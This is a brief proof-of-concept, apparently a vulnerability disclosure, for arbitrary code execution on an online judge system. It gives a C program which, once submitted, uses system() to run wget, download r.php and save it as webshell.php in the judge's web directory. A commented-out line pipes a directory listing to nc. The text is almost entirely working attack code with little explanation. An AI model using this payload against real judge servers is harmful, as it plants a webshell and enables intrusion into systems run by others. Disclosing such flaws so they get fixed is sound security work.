# POC1> 

You can run arbitary code execution via submitting following code on judge system.

	int main(int argc, char* argv[])
	{
	//    system("cd / && /bin/pwd && /bin/ls |  /bin/nc localhost 8081"); // command 1
	    system("/usr/bin/wget localhost:8888/r.php -O /home/judge/src/web/webshell.php"); // command 2
	}

# NOTE
